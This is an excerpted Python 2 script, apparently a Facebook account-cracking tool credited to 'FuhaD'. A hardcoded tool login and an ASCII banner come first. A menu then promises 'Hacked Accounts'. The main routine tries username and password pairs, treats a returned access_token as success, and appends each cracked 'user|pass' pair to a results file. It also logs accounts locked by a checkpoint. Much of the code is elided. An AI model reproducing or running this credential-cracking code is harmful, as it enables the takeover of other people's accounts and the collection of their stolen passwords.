...
██       ██████  ██   ██ ██   ██ ██████  
  ...
  Auther  : FuhaD      			 Github  : FuhadTricker7x
...
os.system('clear')
print logo
CorrectUsername = 'Fuhad'
CorrectPassword = 'FuhaD'
loop = 'true'
while loop == 'true':
    username = raw_inputD('\x1b[1;96m[?] \x1b[1;97mTool USERNAME \x1b[1;96m>>>> ')
    if username == CorrectUsername:
        password = raw_inputD('\x1b[1;96m[?] \x1b[1;97mTool PASWORD \x1b[1;96m>>>> ')
        if password == CorrectPassword:
            print 'NASA Hacked Successful....'
            loop = 'false'
        else:
            print '\x1b[1;91mWrong!,\x1b[1;92mText me to get the correct password'
            os.system('xdg-open https://github.com/FuhadTricker7x')
    else:
...
def menu():
    ...
    time.sleep(0.5)
    print 50 * '\x1b[1;33;40m-'
    psb('\x1b[1;32;40mHacked Accouny Will Appear Here Success id are Just now login & Cp id login afterdays')
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*Fuhad Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('piyash/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[FuhaD(CP) Login After 2 Days] ' + k + c + user + ' | ' + pass1 + '\n'
